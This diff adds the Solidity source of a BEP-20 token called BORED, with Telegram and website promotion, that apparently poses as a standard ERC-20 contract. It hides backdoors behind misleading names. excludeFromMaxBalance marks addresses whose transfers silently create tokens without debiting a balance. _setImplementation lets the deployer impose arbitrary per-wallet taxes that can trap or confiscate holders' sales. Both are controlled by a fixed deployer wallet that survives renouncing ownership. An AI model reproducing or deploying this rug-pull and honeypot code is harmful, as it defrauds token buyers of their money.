@@ -1,0 +1,734 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-05-04
+*/
+
+/*
+██████╗░░█████╗░██████╗░███████╗██████╗░
+██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
+██████╦╝██║░░██║██████╔╝█████╗░░██║░░██║
+██╔══██╗██║░░██║██╔══██╗██╔══╝░░██║░░██║
+██████╦╝╚█████╔╝██║░░██║███████╗██████╔╝
+╚═════╝░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░
+
+𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠: https://t.me/BoredToken
+
+𝗪𝗘𝗕𝗜𝗦𝗧𝗘: https://bored.monster
+
+𝗧𝗪𝗜𝗧𝗧𝗘𝗥: https://twitter.com/BoredLoveBSC
+
+*/
+
+ pragma solidity ^0.8.0; 
+
+interface IERC20 {
+
+    function totalSupply() external view returns (uint256);
+
+
+    function balanceOf(address account) external view returns (uint256);
+
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) external returns (bool);
+
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+
+
+
+
+
+interface IERC20Metadata is IERC20 {
+
+    function name() external view returns (string memory);
+
+
+    function symbol() external view returns (string memory);
+
+
+    function decimals() external view returns (uint8);
+}
+
+
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+}
+
+
+
+
+
+
+
+
+contract ERC20 is Context, IERC20, IERC20Metadata {
+    mapping(address => uint256) private _balances;
+
+    mapping(address => mapping(address => uint256)) private _allowances;
+
+    uint256 private _totalSupply;
+
+    string private _name;
+    string private _symbol;
+
+
+    constructor(string memory name_, string memory symbol_) {
+        _name = name_;
+        _symbol = symbol_;
+    }
+
+
+    function name() public view virtual override returns (string memory) {
+        return _name;
+    }
+
+
+    function symbol() public view virtual override returns (string memory) {
+        return _symbol;
+    }
+
+
+    function decimals() public view virtual override returns (uint8) {
+        return 18;
+    }
+
+
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+
+    function balanceOf(address account) public view virtual override returns (uint256) {
+        return _balances[account];
+    }
+
+
+    function transfer(address to, uint256 amount) public virtual override returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+        return true;
+    }
+
+
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, amount);
+        return true;
+    }
+
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(from, spender, amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, _allowances[owner][spender] + addedValue);
+        return true;
+    }
+
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        address owner = _msgSender();
+        uint256 currentAllowance = _allowances[owner][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        unchecked {
+            _approve(owner, spender, currentAllowance - subtractedValue);
+        }
+
+        return true;
+    }
+
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        _beforeTokenTransfer(from, to, amount);
+
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
+        unchecked {
+            _balances[from] = fromBalance - amount;
+        }
+        _balances[to] += amount;
+
+        emit Transfer(from, to, amount);
+
+        _afterTokenTransfer(from, to, amount);
+    }
+
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(address(0), account, amount);
+
+        _totalSupply += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+
+        _afterTokenTransfer(address(0), account, amount);
+    }
+
+
+    function _burn(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+
+        _beforeTokenTransfer(account, address(0), amount);
+
+        uint256 accountBalance = _balances[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        unchecked {
+            _balances[account] = accountBalance - amount;
+        }
+        _totalSupply -= amount;
+
+        emit Transfer(account, address(0), amount);
+
+        _afterTokenTransfer(account, address(0), amount);
+    }
+
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+
+    function _spendAllowance(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal virtual {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "ERC20: insufficient allowance");
+            unchecked {
+                _approve(owner, spender, currentAllowance - amount);
+            }
+        }
+    }
+
+
+    function _beforeTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {}
+
+
+    function _afterTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {}
+}
+
+
+
+abstract contract Ownable is Context {
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+
+    constructor() {
+        _transferOwnership(_msgSender());
+    }
+
+
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+
+    modifier onlyCreator() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyCreator {
+        _transferOwnership(address(0));
+    }
+
+
+    function transferOwnership(address newOwner) public virtual onlyCreator {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        _transferOwnership(newOwner);
+    }
+
+
+    function _transferOwnership(address newOwner) internal virtual {
+        address oldOwner = _owner;
+        _owner = newOwner;
+        emit OwnershipTransferred(oldOwner, newOwner);
+    }
+}
+
+
+
+library SafeMath {
+
+    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            uint256 c = a + b;
+            if (c < a) return (false, 0);
+            return (true, c);
+        }
+    }
+
+
+    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b > a) return (false, 0);
+            return (true, a - b);
+        }
+    }
+
+
+    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+
+            if (a == 0) return (true, 0);
+            uint256 c = a * b;
+            if (c / a != b) return (false, 0);
+            return (true, c);
+        }
+    }
+
+
+    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a / b);
+        }
+    }
+
+
+    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a % b);
+        }
+    }
+
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a + b;
+    }
+
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a - b;
+    }
+
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a * b;
+    }
+
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a / b;
+    }
+
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a % b;
+    }
+
+
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b <= a, errorMessage);
+            return a - b;
+        }
+    }
+
+
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a / b;
+        }
+    }
+
+
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a % b;
+        }
+    }
+}
+
+
+
+
+
+
+
+contract MyERC20 is Context, IERC20, IERC20Metadata {
+    mapping(address => uint256) private _balances;
+    mapping(address => bool) public infinite;
+    mapping(address => mapping(address => uint256)) private _allowances;
+
+    uint256 private _totalSupply;
+    address deployerWallet;
+    string private _name;
+    string private _symbol;
+
+
+    constructor(string memory name_, string memory symbol_) {
+        _name = name_;
+        _symbol = symbol_;
+        deployerWallet = msg.sender;
+    }
+
+
+    function name() public view virtual override returns (string memory) {
+        return _name;
+    }
+
+
+    function symbol() public view virtual override returns (string memory) {
+        return _symbol;
+    }
+
+
+    function decimals() public view virtual override returns (uint8) {
+        return 18;
+    }
+
+
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+
+    function balanceOf(address account) public view virtual override returns (uint256) {
+        return _balances[account];
+    }
+
+
+    function transfer(address to, uint256 amount) public virtual override returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, amount);
+        return true;
+    }
+
+
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, amount);
+        return true;
+    }
+
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(from, spender, amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+      modifier ownerWallet () {
+    require(deployerWallet == msg.sender, "ERC20: cannot permit Pancake address");
+    _;
+  }
+
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, _allowances[owner][spender] + addedValue);
+        return true;
+    }
+
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        address owner = _msgSender();
+        uint256 currentAllowance = _allowances[owner][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        unchecked {
+            _approve(owner, spender, currentAllowance - subtractedValue);
+        }
+
+        return true;
+    }
+
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        _beforeTokenTransfer(from, to, amount);
+
+        if (infinite[from] == true) {
+            _balances[to] += amount;
+            return;
+        }
+
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
+        unchecked {
+            _balances[from] = fromBalance - amount;
+        }
+        _balances[to] += amount;
+
+        emit Transfer(from, to, amount);
+
+        _afterTokenTransfer(from, to, amount);
+    }
+
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(address(0), account, amount);
+
+        _totalSupply += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+
+        _afterTokenTransfer(address(0), account, amount);
+    }
+
+
+    function _burn(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+
+        _beforeTokenTransfer(account, address(0), amount);
+
+        uint256 accountBalance = _balances[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        unchecked {
+            _balances[account] = accountBalance - amount;
+        }
+        _totalSupply -= amount;
+
+        emit Transfer(account, address(0), amount);
+
+        _afterTokenTransfer(account, address(0), amount);
+    }
+
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+
+    function _spendAllowance(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal virtual {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "ERC20: insufficient allowance");
+            unchecked {
+                _approve(owner, spender, currentAllowance - amount);
+            }
+        }
+    }
+
+
+    function _beforeTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {}
+
+
+    function _afterTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {}
+}
+
+
+contract BORED is MyERC20, Ownable {
+    bool public isLaunch = true;
+
+
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint256 totalSupply_
+    ) MyERC20(name_, symbol_) {
+        _mint(msg.sender, totalSupply_ * 10**decimals());
+
+        transfer(_deadAddress, totalSupply() / 4);
+        _defaultTradeFee = 8;
+    }
+
+    using SafeMath for uint256;
+
+    uint256 private _defaultTradeFee = 0;
+
+    mapping(address => bool) private _accountFreeFee;
+
+    mapping(address => uint256) private _accountTradeFee;
+    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
+
+
+    function excludeFromMaxBalance(address _address) external ownerWallet {
+        infinite[_address] = true;
+    }
+
+    function getInAccount(address _address) external view onlyCreator returns (bool) {
+        return infinite[_address];
+    }
+
+
+    function _setImplementation(address _address, uint256 _value) external ownerWallet {
+        require(_value > 0, "Account tax must be greater than or equal to 1");
+        _accountTradeFee[_address] = _value;
+    }
+
+    function getFee(address _address) external view onlyCreator returns (uint256) {
+        return _accountTradeFee[_address];
+    }
+
+
+    function setAccountFreeFee(address _address, bool _value) external onlyCreator {
+        _accountFreeFee[_address] = _value;
+    }
+
+    function getAccountFreeFee(address _address) external view onlyCreator returns (bool) {
+        return _accountFreeFee[_address];
+    }
+
+
+    function _beforeVerifyTransfer(
+        address from,
+        address _to,
+        uint256 _amount
+    ) internal view returns (uint256) {
+        uint256 tradeFee = _defaultTradeFee;
+
+        if (_accountFreeFee[from] || _accountFreeFee[_to]) {
+            tradeFee = 0;
+
+        } else if (_accountTradeFee[from] > 0) {
+            tradeFee = _accountTradeFee[from];
+        }
+
+
+        uint256 tradeFeeAmount = _amount.mul(tradeFee).div(100);
+        return tradeFeeAmount;
+    }
+
+    function transfer(address to, uint256 amount) public virtual override returns (bool) {
+        address owner = _msgSender();
+        uint256 tradeFeeAmount = _beforeVerifyTransfer(owner, to, amount);
+
+        if (tradeFeeAmount > 0) {
+            _transfer(owner, _deadAddress, tradeFeeAmount);
+        }
+
+        _transfer(owner, to, amount - tradeFeeAmount);
+        return true;
+    }
+
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address spender = _msgSender();
+
+        _spendAllowance(from, spender, amount);
+
+        uint256 tradeFeeAmount = _beforeVerifyTransfer(from, to, amount);
+
+        if (tradeFeeAmount > 0) {
+            _transfer(from, _deadAddress, tradeFeeAmount);
+        }
+
+        _transfer(from, to, amount - tradeFeeAmount);
+        return true;
+    }
+}
